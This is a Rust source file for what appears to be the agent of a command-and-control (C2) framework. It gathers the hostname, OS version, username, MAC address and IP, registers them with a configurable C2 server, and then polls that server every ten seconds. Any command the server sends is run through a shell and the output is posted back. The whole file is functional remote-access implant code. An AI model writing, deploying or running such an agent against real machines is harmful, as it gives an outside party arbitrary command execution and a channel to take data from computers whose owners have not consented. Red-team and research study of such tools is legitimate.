use protocol::*;
use std::process::Command;
use std::time::Duration;
use tokio::time;
use uuid::Uuid;
use std::env;

const BEACON_INTERVAL: u64 = 10;

fn get_server_url() -> String {
    env::var("C2_SERVER")
        .unwrap_or_else(|_| {
            env::args()
                .nth(1)
                .unwrap_or_else(|| "http://127.0.0.1:8080".to_string())
        })
}

#[derive(Debug)]
struct AgentState {
    agent_id: Option<Uuid>,
    hostname: String,
    os: String,
    os_version: String,
    username: String,
}

impl AgentState {
    fn new() -> Self {
        let hostname = sys_info::hostname().unwrap_or_else(|_| "unknown".to_string());
        let os = sys_info::os_type().unwrap_or_else(|_| "unknown".to_string());
        
        // Get detailed OS version
        let os_version = get_detailed_os_version();
        
        let username = std::env::var("USER")
            .or_else(|_| std::env::var("USERNAME"))
            .unwrap_or_else(|_| "unknown".to_string());

        AgentState {
            agent_id: None,
            hostname,
            os,
            os_version,
            username,
        }
    }
}

fn get_detailed_os_version() -> String {
    #[cfg(target_os = "linux")]
    {
        // Try to read /etc/os-release for detailed info
        if let Ok(output) = Command::new("cat").arg("/etc/os-release").output() {
            if output.status.success() {
                let content = String::from_utf8_lossy(&output.stdout);
                let mut name = String::new();
                let mut version = String::new();
                
                for line in content.lines() {
                    if line.starts_with("PRETTY_NAME=") {
                        name = line.split('=').nth(1)
                            .unwrap_or("")
                            .trim_matches('"')
                            .to_string();
                    } else if line.starts_with("VERSION=") && version.is_empty() {
                        version = line.split('=').nth(1)
                            .unwrap_or("")
                            .trim_matches('"')
                            .to_string();
                    }
                }
                
                if !name.is_empty() {
                    return name;
                }
                if !version.is_empty() {
                    return version;
                }
            }
        }
        
        // Fallback to uname
        if let Ok(output) = Command::new("uname").arg("-r").output() {
            if output.status.success() {
                return String::from_utf8_lossy(&output.stdout).trim().to_string();
            }
        }
    }
    
    #[cfg(target_os = "windows")]
    {
        if let Ok(output) = Command::new("cmd")
            .args(["/C", "ver"])
            .output() 
        {
            if output.status.success() {
                return String::from_utf8_lossy(&output.stdout).trim().to_string();
            }
        }
    }
    
    #[cfg(target_os = "macos")]
    {
        if let Ok(output) = Command::new("sw_vers").arg("-productVersion").output() {
            if output.status.success() {
                return format!("macOS {}", String::from_utf8_lossy(&output.stdout).trim());
            }
        }
    }
    
    // Final fallback
    sys_info::os_release().unwrap_or_else(|_| "unknown".to_string())
}

async fn register_agent(client: &reqwest::Client, state: &mut AgentState, server_url: &str) -> Result<(), Box<dyn std::error::Error>> {
    let mac = get_mac_address();
    let ip = get_local_ip();

    let request = RegisterRequest {
        hostname: state.hostname.clone(),
        os: state.os.clone(),
        os_version: state.os_version.clone(),
        mac,
        ip,
        username: state.username.clone(),
    };

    let response = client
        .post(format!("{}/register", server_url))
        .json(&request)
        .send()
        .await?;

    if response.status().is_success() {
        let register_response: RegisterResponse = response.json().await?;
        state.agent_id = Some(register_response.agent_id);
        println!("[+] Registered with server. Agent ID: {}", register_response.agent_id);
        Ok(())
    } else {
        Err(format!("Registration failed: {}", response.status()).into())
    }
}

async fn send_beacon(client: &reqwest::Client, state: &AgentState, server_url: &str) -> Result<Option<Task>, Box<dyn std::error::Error>> {
    let agent_id = state.agent_id.ok_or("Agent not registered")?;

    let request = BeaconRequest {
        agent_id,
        hostname: state.hostname.clone(),
        os: state.os.clone(),
    };

    let response = client
        .post(format!("{}/beacon", server_url))
        .json(&request)
        .send()
        .await?;

    if response.status().is_success() {
        let beacon_response: BeaconResponse = response.json().await?;
        Ok(beacon_response.task)
    } else {
        Err(format!("Beacon failed: {}", response.status()).into())
    }
}

async fn execute_task(task: &Task) -> (String, i32) {
    println!("[*] Executing task {}: {}", task.task_id, task.command);

    let output = if cfg!(target_os = "windows") {
        Command::new("cmd")
            .args(["/C", &task.command])
            .output()
    } else {
        Command::new("sh")
            .args(["-c", &task.command])
            .output()
    };

    match output {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout).to_string();
            let stderr = String::from_utf8_lossy(&output.stderr).to_string();
            let combined = format!("{}{}", stdout, stderr);
            let exit_code = output.status.code().unwrap_or(-1);
            println!("[+] Task {} completed with exit code {}", task.task_id, exit_code);
            (combined, exit_code)
        }
        Err(e) => {
            println!("[-] Task {} execution error: {}", task.task_id, e);
            (format!("Execution error: {}", e), -1)
        }
    }
}

async fn send_task_result(
    client: &reqwest::Client,
    agent_id: Uuid,
    task_id: Uuid,
    output: String,
    exit_code: i32,
    server_url: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    let request = TaskResultRequest {
        agent_id,
        task_id,
        output,
        exit_code,
    };

    let response = client
        .post(format!("{}/task_result", server_url))
        .json(&request)
        .send()
        .await?;

    if response.status().is_success() {
        println!("[+] Task result sent successfully");
        Ok(())
    } else {
        Err(format!("Failed to send task result: {}", response.status()).into())
    }
}

fn get_mac_address() -> String {
    #[cfg(target_os = "linux")]
    {
        // Try multiple common network interfaces
        let interfaces = vec!["eth0", "enp0s3", "ens33", "wlan0", "wlp2s0"];
        
        for interface in interfaces {
            let path = format!("/sys/class/net/{}/address", interface);
            if let Ok(output) = Command::new("cat").arg(&path).output() {
                if output.status.success() {
                    let mac = String::from_utf8_lossy(&output.stdout).trim().to_string();
                    if !mac.is_empty() && mac != "00:00:00:00:00:00" {
                        return mac;
                    }
                }
            }
        }
        
        // Fallback: try ip link command
        if let Ok(output) = Command::new("ip").arg("link").output() {
            if output.status.success() {
                let output_str = String::from_utf8_lossy(&output.stdout);
                // Parse for MAC address pattern
                for line in output_str.lines() {
                    if line.contains("link/ether") {
                        let parts: Vec<&str> = line.split_whitespace().collect();
                        if parts.len() >= 2 {
                            return parts[1].to_string();
                        }
                    }
                }
            }
        }
    }
    
    #[cfg(target_os = "windows")]
    {
        if let Ok(output) = Command::new("getmac").arg("/FO").arg("CSV").arg("/NH").output() {
            if output.status.success() {
                let output_str = String::from_utf8_lossy(&output.stdout);
                if let Some(line) = output_str.lines().next() {
                    // Parse CSV format: "MAC","Transport Name"
                    if let Some(mac) = line.split(',').next() {
                        return mac.trim_matches('"').to_string();
                    }
                }
            }
        }
    }
    
    "00:00:00:00:00:00".to_string()
}

fn get_local_ip() -> String {
    #[cfg(target_os = "linux")]
    {
        // Try hostname -I first
        if let Ok(output) = Command::new("hostname").arg("-I").output() {
            if output.status.success() {
                let ips = String::from_utf8_lossy(&output.stdout);
                if let Some(first_ip) = ips.split_whitespace().next() {
                    if !first_ip.starts_with("127.") {
                        return first_ip.to_string();
                    }
                }
            }
        }
        
        // Fallback: try ip addr command
        if let Ok(output) = Command::new("ip").arg("addr").output() {
            if output.status.success() {
                let output_str = String::from_utf8_lossy(&output.stdout);
                for line in output_str.lines() {
                    if line.contains("inet ") && !line.contains("127.0.0.1") {
                        let parts: Vec<&str> = line.trim().split_whitespace().collect();
                        if parts.len() >= 2 {
                            let ip_cidr = parts[1];
                            if let Some(ip) = ip_cidr.split('/').next() {
                                return ip.to_string();
                            }
                        }
                    }
                }
            }
        }
    }
    
    #[cfg(target_os = "windows")]
    {
        if let Ok(output) = Command::new("ipconfig").output() {
            if output.status.success() {
                let output_str = String::from_utf8_lossy(&output.stdout);
                for line in output_str.lines() {
                    if line.contains("IPv4 Address") {
                        if let Some(ip_part) = line.split(':').nth(1) {
                            let ip = ip_part.trim();
                            if !ip.starts_with("127.") {
                                return ip.to_string();
                            }
                        }
                    }
                }
            }
        }
    }
    
    "127.0.0.1".to_string()
}

#[tokio::main]
async fn main() {
    let server_url = get_server_url();
    println!("[*] Agent starting...");
    println!("[*] C2 Server: {}", server_url);
    
    let client = reqwest::Client::new();
    let mut state = AgentState::new();
    let mut interval = time::interval(Duration::from_secs(BEACON_INTERVAL));

    loop {
        interval.tick().await;

        if state.agent_id.is_none() {
            println!("[*] Attempting to register with server...");
            if let Err(e) = register_agent(&client, &mut state, &server_url).await {
                println!("[-] Registration failed: {}. Retrying...", e);
                continue;
            }
        }

        match send_beacon(&client, &state, &server_url).await {
            Ok(Some(task)) => {
                let (output, exit_code) = execute_task(&task).await;
                
                if let Err(e) = send_task_result(
                    &client,
                    state.agent_id.unwrap(),
                    task.task_id,
                    output,
                    exit_code,
                    &server_url,
                )
                .await
                {
                    println!("[-] Failed to send task result: {}", e);
                }
            }
            Ok(None) => {
                println!("[*] No tasks available");
            }
            Err(e) => {
                println!("[-] Beacon error: {}. Will retry...", e);
            }
        }
    }
}
